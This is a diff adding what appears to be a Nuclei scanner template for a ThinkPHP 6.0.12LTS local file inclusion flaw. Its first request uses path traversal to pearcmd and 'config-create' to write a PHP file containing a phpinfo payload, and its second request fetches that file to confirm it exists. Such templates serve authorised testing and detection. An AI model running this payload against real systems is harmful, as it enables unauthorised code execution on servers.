@@ -1,0 +1,45 @@
+id: thinkphp-6-0-12-lts-file-inclusion
+info:
+  name: "ThinkPHP 6.0.12LTS 文件包含漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: thinkphp
+
+variables:
+  t1: "{{rand_base(3)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: create-config
+    method: GET
+    path:
+      - "{{BaseURL}}/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "PHP extension directory"
+
+  - id: validate-config
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "php_dir"
+      - type: word
+        part: body
+        words:
+          - "phpinfo()"
